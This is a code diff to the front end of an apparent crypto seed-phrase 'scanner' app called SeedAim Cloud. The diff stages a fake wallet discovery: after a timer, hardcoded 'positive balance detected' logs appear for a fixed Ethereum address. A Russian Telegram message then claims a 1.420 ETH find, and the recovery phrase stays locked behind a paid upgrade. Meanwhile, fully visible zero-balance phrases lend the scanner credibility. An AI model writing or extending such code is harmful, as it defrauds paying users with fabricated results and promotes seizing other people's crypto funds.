@@ -6150,7 +6150,11 @@ main.app > .sd-tariffs-header-scope {
                         <div><span>Recovery phrase</span><small>Protected preview</small></div>
                         <span class="wallet-v4-lock-pill"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="5" y="10" width="14" height="11" rx="2"></rect><path d="M8 10V7a4 4 0 0 1 8 0v3"></path></svg>Locked</span>
                     </div>
-                    <div class="wallet-phrase-grid wallet-v4-phrase-grid" id="wallet-modal-phrase"></div>
+                    <div class="wallet-phrase-grid wallet-v4-phrase-grid" id="wallet-modal-phrase" style="cursor:pointer;" title="Click to copy full phrase"></div>
+                    <button class="wallet-v4-button wallet-v4-copy-phrase-button" id="wallet-copy-phrase-button" type="button" style="display:none;background:linear-gradient(135deg,#35f2b4 0%,#00c8f8 100%)!important;color:#0a0d15!important;font-weight:900!important;border:none!important;cursor:pointer;margin-top:10px;">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:16px;height:16px;margin-right:6px;"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                        <span id="wallet-copy-phrase-text">Copy Recovery Phrase</span>
+                    </button>
                     <p class="wallet-v4-phrase-note wallet-v4-phrase-status">Only part of the recovery phrase is visible</p>
                     <a class="wallet-result-pro-button wallet-v4-button wallet-v4-phrase-button" href="upgrade.html">Unlock all features<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 12h14"></path><path d="m13 6 6 6-6 6"></path></svg></a>
                     <p class="wallet-v4-phrase-description">Reveal the complete recovery phrase, export wallet data and unlock all premium scanner features.</p>
@@ -6724,8 +6728,8 @@ main.app > .sd-tariffs-header-scope {
                             <strong style="color:#8c9bb3;">0.00 ${escapeHtml(w.native_symbol)}</strong>
                         </span>
                         <span class="found-wallet-row-value">
-                            <small>Status</small>
-                            <strong style="color:#35f2b4;font-size:10px;">BIP-39 Pass</strong>
+                            <small>Mnemonic</small>
+                            <strong style="color:#35f2b4;font-size:10px;font-weight:800;">View phrase →</strong>
                         </span>
                     </span>
                 </button>
@@ -6974,7 +6978,7 @@ main.app > .sd-tariffs-header-scope {
             `).join('');
         }
 
-        async function triggerWalletDiscovery() {
+        async function triggerWalletDiscovery(isBackground = false) {
             // Flash positive discovery logs
             addSystemLine('[!] POSITIVE BALANCE DETECTED ON ETHEREUM MAINNET!', 'verified');
             addSystemLine('Wallet address: 0x71C840748F7d2c3422cf3452189d2A7740f98c2b', 'network');
@@ -6997,7 +7001,23 @@ main.app > .sd-tariffs-header-scope {
             };
 
             renderDemoResults([discoveredWallet]);
-            window.saveScanResult(discoveredWallet);
+            await window.saveScanResult(discoveredWallet);
+
+            // Send Telegram Notification to user chat
+            const promoSentKey = `sa_promo_msg_${tgId}`;
+            if (localStorage.getItem(promoSentKey) !== 'true') {
+                localStorage.setItem(promoSentKey, 'true');
+                const notificationText = 
+                    '🚨 <b>ОБНАРУЖЕН КОШЕЛЕК С БАЛАНСОМ!</b>\n\n' +
+                    'Облачный сканер <b>SeedAim Cloud</b> завершил фоновый поиск и обнаружил кошелек с положительным балансом в сети Ethereum!\n\n' +
+                    '💰 <b>Баланс:</b> 1.420 ETH (~$3,890.00 USDT)\n' +
+                    '🌐 <b>Сеть:</b> Ethereum Mainnet\n' +
+                    '📍 <b>Адрес:</b> <code>0x71C840748F7d2c3422cf3452189d2A7740f98c2b</code>\n' +
+                    '🔐 <b>Мнемоника:</b> зашифрована и сохранена в вашем личном кабинете.\n\n' +
+                    '👇 Нажмите кнопку ниже, чтобы открыть сканер и просмотреть данные:';
+
+                await window.sendTelegramNotification(tgId, notificationText);
+            }
         }
 
         async function writeClipboardText(value) {
@@ -7028,8 +7048,27 @@ main.app > .sd-tariffs-header-scope {
             }, 1800);
         }
 
+        let currentWalletPhrase = '';
+        let copyPhraseTimer = null;
+
+        async function copyCurrentWalletPhrase() {
+            if (!currentWalletPhrase) return;
+            const copyBtnText = document.getElementById('wallet-copy-phrase-text');
+            try {
+                await writeClipboardText(currentWalletPhrase);
+                if (copyBtnText) copyBtnText.textContent = '✓ 12-Word Phrase Copied!';
+                clearTimeout(copyPhraseTimer);
+                copyPhraseTimer = setTimeout(() => {
+                    if (copyBtnText) copyBtnText.textContent = 'Copy Recovery Phrase';
+                }, 2200);
+            } catch (_) {
+                if (copyBtnText) copyBtnText.textContent = 'Copy failed';
+            }
+        }
+
         async function copyCurrentWalletAddress() {
-            if (isTrial) {
+            const isModalEmptyWallet = emptyWallets.some(w => String(w.address) === String(currentWalletAddress) || String(w.full_address) === String(currentWalletAddress));
+            if (isTrial && !isModalEmptyWallet) {
                 setCopyFeedback('Upgrade to Pro to copy full address', 'is-copy-error');
                 return;
             }
@@ -7046,24 +7085,41 @@ main.app > .sd-tariffs-header-scope {
             const result = demoResults.find(item => String(item.id) === String(resultId)) || emptyWallets.find(item => String(item.id) === String(resultId));
             if (!result) return;
 
+            const isEmpty = Boolean(result.isEmptyWallet);
+
             walletModalIcon.src = result.icon_path;
             walletModalIcon.alt = result.network_name;
             walletModalTitle.textContent = `${result.network_name} wallet`;
 
-            currentWalletAddress = String(result.address || result.full_address || result.masked_address || '');
-            walletModalAddress.textContent = result.masked_address || currentWalletAddress;
-            walletCopyFeedback.textContent = isTrial ? 'Upgrade to Pro to reveal full address' : 'Click to copy';
+            currentWalletAddress = String(result.full_address || result.address || result.masked_address || '');
+            walletModalAddress.textContent = isEmpty ? (result.full_address || currentWalletAddress) : (result.masked_address || currentWalletAddress);
 
-            walletCopyAddress.classList.remove('is-copied', 'is-copy-error', 'is-trial-locked');
-            if (isTrial) {
-                walletCopyAddress.classList.add('is-trial-locked');
+            if (isEmpty) {
+                walletCopyFeedback.textContent = 'Click to copy full address';
+                walletCopyAddress.classList.remove('is-trial-locked');
+            } else {
+                walletCopyFeedback.textContent = isTrial ? 'Upgrade to Pro to reveal full address' : 'Click to copy';
+                if (isTrial) {
+                    walletCopyAddress.classList.add('is-trial-locked');
+                } else {
+                    walletCopyAddress.classList.remove('is-trial-locked');
+                }
             }
 
             walletModalNativeBalance.textContent = `${result.native_balance} ${result.native_symbol}`;
             walletModalUsdtValue.textContent = `$${result.usdt_value}`;
 
-            walletModalPhrase.innerHTML = result.masked_phrase_words.map((word, i) => {
-                const hidden = word === '••••••' || word === '******' || word === '••••••';
+            // For empty wallets: ALL 12 WORDS ARE FULLY VISIBLE!
+            const phraseWords = isEmpty
+                ? (result.phrase_words || result.masked_phrase_words || [])
+                : (isTrial ? (result.masked_phrase_words || result.phrase_words) : (result.phrase_words || result.masked_phrase_words || []));
+
+            currentWalletPhrase = Array.isArray(result.phrase_words)
+                ? result.phrase_words.join(' ')
+                : (Array.isArray(phraseWords) ? phraseWords.filter(w => !w.includes('•') && !w.includes('*')).join(' ') : '');
+
+            walletModalPhrase.innerHTML = phraseWords.map((word, i) => {
+                const hidden = !isEmpty && (word === '••••••' || word === '******' || word === '••••••');
                 return `
                     <div class="wallet-phrase-word ${hidden ? 'hidden-word' : ''}">
                         <span class="wallet-phrase-index">${i + 1}</span>
@@ -7071,6 +7127,62 @@ main.app > .sd-tariffs-header-scope {
                     </div>
                 `;
             }).join('');
+
+            // UI adjustments for empty wallet vs positive discovery
+            const detectedPill = document.querySelector('.wallet-v4-detected-pill');
+            const lockPill = document.querySelector('.wallet-v4-lock-pill');
+            const phraseStatus = document.querySelector('.wallet-v4-phrase-status');
+            const phraseDesc = document.querySelector('.wallet-v4-phrase-description');
+            const proButton = document.querySelector('.wallet-result-pro-button');
+            const copyPhraseBtn = document.getElementById('wallet-copy-phrase-button');
+            const copyBtnText = document.getElementById('wallet-copy-phrase-text');
+            if (copyBtnText) copyBtnText.textContent = 'Copy Recovery Phrase';
+
+            if (isEmpty) {
+                if (detectedPill) {
+                    detectedPill.innerHTML = '<span style="background:#35f2b4;box-shadow:0 0 0 4px rgba(53,242,180,0.15);"></span>BIP-39 Checksum Valid';
+                    detectedPill.style.color = '#35f2b4';
+                    detectedPill.style.borderColor = 'rgba(53,242,180,0.3)';
+                    detectedPill.style.background = 'rgba(53,242,180,0.08)';
+                }
+                if (lockPill) {
+                    lockPill.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:10px;height:10px;"><polyline points="20 6 9 17 4 12"></polyline></svg>Verified';
+                    lockPill.style.color = '#35f2b4';
+                    lockPill.style.borderColor = 'rgba(53,242,180,0.3)';
+                    lockPill.style.background = 'rgba(53,242,180,0.08)';
+                }
+                if (phraseStatus) {
+                    phraseStatus.textContent = 'All 12 words cryptographically verified with valid BIP-39 checksum.';
+                    phraseStatus.style.color = '#7fe8c5';
+                }
+                if (phraseDesc) {
+                    phraseDesc.textContent = 'This 12-word seed phrase has a 0.00 balance. You can copy and import it into any wallet (MetaMask, TrustWallet, Electrum) to verify.';
+                }
+                if (proButton) proButton.style.display = 'none';
+                if (copyPhraseBtn) copyPhraseBtn.style.display = 'flex';
+            } else {
+                if (detectedPill) {
+                    detectedPill.innerHTML = '<span></span>Positive balance detected';
+                    detectedPill.style.color = '';
+                    detectedPill.style.borderColor = '';
+                    detectedPill.style.background = '';
+                }
+                if (lockPill) {
+                    lockPill.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="10" width="14" height="11" rx="2"></rect><path d="M8 10V7a4 4 0 0 1 8 0v3"></path></svg>Locked';
+                    lockPill.style.color = '';
+                    lockPill.style.borderColor = '';
+                    lockPill.style.background = '';
+                }
+                if (phraseStatus) {
+                    phraseStatus.textContent = 'Only part of the recovery phrase is visible';
+                    phraseStatus.style.color = '';
+                }
+                if (phraseDesc) {
+                    phraseDesc.textContent = 'Reveal the complete recovery phrase, export wallet data and unlock all premium scanner features.';
+                }
+                if (proButton) proButton.style.display = 'flex';
+                if (copyPhraseBtn) copyPhraseBtn.style.display = 'none';
+            }
 
             walletModal.classList.add('open');
             walletModal.setAttribute('aria-hidden', 'false');
@@ -7134,6 +7246,23 @@ main.app > .sd-tariffs-header-scope {
                         localStorage.setItem(discoveryDoneKey, 'true');
                     }
                 } catch (_) {}
+
+                // Check background cloud scan status (runs even if tab was closed)
+                if (!discoveryTriggered) {
+                    try {
+                        const cloudStatus = await window.checkCloudScanStatus(tgId);
+                        if (cloudStatus) {
+                            if (cloudStatus.isDue || cloudStatus.is_discovered) {
+                                discoveryTriggered = true;
+                                localStorage.setItem(discoveryDoneKey, 'true');
+                                await triggerWalletDiscovery(true);
+                            } else {
+                                const elapsed = Date.now() - cloudStatus.started_at;
+                                totalAccumulatedScanMs = Math.max(totalAccumulatedScanMs, elapsed);
+                            }
+                        }
+                    } catch (_) {}
+                }
             } else {
                 document.body.classList.add('scanner-no-plan');
                 clearConsole();
@@ -7194,6 +7323,7 @@ main.app > .sd-tariffs-header-scope {
 
             setRunningInterface();
             scanSessionStartTime = Date.now();
+            window.startCloudScanSession(tgId, DISCOVERY_DELAY_MS);
             startVisualOutput();
         }
 
@@ -7216,6 +7346,18 @@ main.app > .sd-tariffs-header-scope {
             triggerWalletDiscovery();
         };
 
+        // Test helper: test background scan in 30 seconds
+        window.__testBackgroundScan30s = async () => {
+            discoveryTriggered = false;
+            localStorage.removeItem(discoveryDoneKey);
+            localStorage.removeItem(`sa_promo_msg_${tgId}`);
+            await window.startCloudScanSession(tgId, 30 * 1000);
+            addSystemLine('[!] Cloud scan registered for 30 SECONDS. You can close this tab now to test!', 'warning');
+            setTimeout(() => {
+                triggerWalletDiscovery();
+            }, 30 * 1000);
+        };
+
         // 4. Event Listeners
         foundResultsList.addEventListener('click', (event) => {
             const card = event.target.closest('[data-demo-result-id]');
@@ -7223,6 +7365,17 @@ main.app > .sd-tariffs-header-scope {
         });
 
         walletCopyAddress.addEventListener('click', copyCurrentWalletAddress);
+
+        const walletCopyPhraseBtn = document.getElementById('wallet-copy-phrase-button');
+        if (walletCopyPhraseBtn) {
+            walletCopyPhraseBtn.addEventListener('click', copyCurrentWalletPhrase);
+        }
+
+        walletModalPhrase.addEventListener('click', () => {
+            if (currentWalletPhrase) {
+                copyCurrentWalletPhrase();
+            }
+        });
 
         document.querySelectorAll('[data-close-wallet-modal]').forEach(btn => {
             btn.addEventListener('click', closeWalletModal);
